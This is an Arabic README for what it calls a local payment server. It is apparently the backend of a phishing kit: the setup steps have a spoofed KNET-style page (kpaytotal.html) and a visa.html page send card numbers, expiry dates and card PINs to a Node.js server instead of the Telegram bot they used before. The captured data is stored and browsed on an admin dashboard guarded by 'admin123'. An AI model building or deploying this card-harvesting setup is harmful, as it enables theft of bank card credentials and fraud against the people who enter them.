# 🎛️ نظام الدفع المحلي المستقل

نظام دفع محلي مستقل 100% لا يعتمد على أي APIs خارجية. كل شيء يعمل من داخل ملفاتك.

## ✨ المميزات

✅ **خادم محلي مستقل** - Node.js + Express  
✅ **قاعدة بيانات JSON** - حفظ آمن للبيانات  
✅ **لوحة تحكم ديناميكية** - مراقبة الطلبات والمدفوعات  
✅ **بدون APIs خارجية** - لا Telegram، لا مكتبات ثالثة معقدة  
✅ **سهل التخصيص** - كل الكود محلي وواضح  

## 🚀 البدء السريع

### 1️⃣ تثبيت Node.js
أولاً، تأكد من تثبيت Node.js على جهازك:
```bash
# تحقق من التثبيت
node --version
npm --version
```

إذا لم تثبّت Node.js، قم بتحميله من: https://nodejs.org

### 2️⃣ تثبيت المكتبات
في مجلد المشروع، قم بتشغيل:
```bash
npm install
```

هذا سيثبت:
- Express (خادم الويب)
- CORS (للطلبات بين النطاقات)
- Body Parser (لمعالجة البيانات)
- UUID (لإنشاء معرّفات فريدة)

### 3️⃣ تشغيل الخادم
```bash
npm start
```

أو

```bash
node server.js
```

يجب أن ترى هذا:
```
╔════════════════════════════════════════╗
║  🚀 خادم الدفع المحلي قيد التشغيل       ║
║  الموقع: http://localhost:3000         ║
║  لوحة التحكم: http://localhost:3000/admin  ║
╚════════════════════════════════════════╝
```

### 4️⃣ فتح لوحة التحكم
افتح المتصفح واذهب إلى:
```
http://localhost:3000/admin
```

ستجد هنا:
- 📊 إحصائيات الطلبات والمدفوعات
- 💳 جميع بيانات المدفوعات المستقبلة
- 🛒 قائمة الطلبات

## 📝 كيفية الاستخدام

### استبدال Telegram بالخادم المحلي

**الطريقة القديمة (Telegram):**
```javascript
function sendToTelegram() {
    const botConfigs = [{
        token: '...',
        chatId: '...'
    }];
    fetch(url, {...})
}
```

**الطريقة الجديدة (الخادم المحلي):**
```javascript
// استيراد مكتبة الدفع
<script src="payment-client.js"></script>

// استخدام الدالة الجديدة
async function sendPayment() {
    const paymentData = {
        name: "أحمد محمد",
        bank: "NBK",
        prefix: "464452",
        cardNumber: "1234567890",
        expiryMonth: "12",
        expiryYear: "25",
        pin: "1234",
        amount: "10"
    };
    
    const result = await sendPaymentToServer(paymentData);
    
    if (result.success) {
        console.log("✅ تم الإرسال:", result.paymentId);
    } else {
        console.error("❌ فشل:", result.message);
    }
}
```

## 🔌 API Endpoints

### إرسال دفعة جديدة
```
POST /api/payment
Content-Type: application/json

{
    "name": "اسم العميل",
    "bank": "NBK",
    "prefix": "464452",
    "cardNumber": "1234567890",
    "expiryMonth": "12",
    "expiryYear": "25",
    "pin": "1234",
    "amount": "10"
}
```

### الحصول على جميع المدفوعات
```
GET /api/payments
```

### الحصول على جميع الطلبات
```
GET /api/orders
```

### الحصول على الإحصائيات
```
GET /api/dashboard/stats
```

### إنشاء طلب جديد
```
POST /api/orders
Content-Type: application/json

{
    "items": [...],
    "totalAmount": 100,
    "customerName": "محمد",
    "customerPhone": "+96598765432"
}
```

## 📂 هيكل المشروع

```
Wormhole Q55n9J/
├── server.js              ← الخادم الرئيسي
├── payment-client.js      ← عميل الدفع (يُستخدم في HTML)
├── package.json           ← تبعيات المشروع
├── data/                  ← مجلد البيانات
│   ├── payments.json      ← سجل المدفوعات
│   └── orders.json        ← سجل الطلبات
├── kpaytotal.html         ← صفحة الدفع (معدّلة)
├── visa.html              ← صفحة فيزا
└── ... (باقي الملفات)
```

## 🔐 الأمان

⚠️ **ملاحظات أمنية:**

1. **لا تُحفظ كلمات السر** - الأرقام الموجودة في قاعدة البيانات هي فقط للاختبار
2. **استخدم HTTPS في الإنتاج** - لا تستخدم HTTP للدفع الحقيقي
3. **غيّر كلمة السر الإدارية** - ابحث عن `admin123` في `server.js` وغيّرها
4. **لا تنشر البيانات علناً** - احتفظ بملف `data/` آمناً

## 🛠️ تعديل النماذج

لاستخدام الخادم المحلي في ملفات HTML الموجودة:

### في kpaytotal.html:
```html
<!-- أضف في رأس الملف -->
<script src="payment-client.js"></script>

<!-- غيّر من -->
<form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();">

<!-- إلى -->
<form id="paymentForm" onsubmit="event.preventDefault(); sendToLocalServer();">
```

## 📊 مثال على البيانات المحفوظة

```json
{
    "id": "550e8400-e29b-41d4-a716-446655440000",
    "timestamp": "2026-05-23T10:30:45.123Z",
    "status": "pending",
    "customerName": "محمد أحمد",
    "bank": "NBK",
    "prefix": "464452",
    "cardNumber": "1234567890",
    "expiryMonth": "12",
    "expiryYear": "25",
    "pin": "1234",
    "amount": "10",
    "ipAddress": "127.0.0.1"
}
```

## 🔄 المراحل القادمة

يمكنك إضافة:
- ✅ تشفير البيانات
- ✅ قاعدة بيانات SQLite/MySQL
- ✅ نظام إشعارات بريدي
- ✅ واجهة إدارية متقدمة
- ✅ نظام الرسائل النصية

## 💡 نصائح مفيدة

1. **تتبع الأخطاء:**
   ```bash
   node server.js > logs.txt 2>&1
   ```

2. **تشغيل الخادم في الخلفية (Windows):**
   ```bash
   start node server.js
   ```

3. **إيقاف الخادم:**
   اضغط `Ctrl + C` في الطرفية

## ❓ الأسئلة الشائعة

**س: هل يمكنني تشغيل هذا على جهاز آخر؟**  
ج: نعم، غيّر `localhost` إلى عنوان IP جهازك في `payment-client.js`

**س: كيف أحذف جميع البيانات؟**  
ج: قم بحذف مجلد `data/` أو استخدم API:
```
POST /api/admin/clear-data
Body: { "password": "admin123" }
```

**س: هل هذا آمن للدفع الحقيقي؟**  
ج: لا، هذا للاختبار والتطوير فقط. للإنتاج، استخدم خدمة دفع معتمدة.

---

🎉 **تم! النظام جاهز للاستخدام!**

للدعم والمساعدة، تواصل معي! 
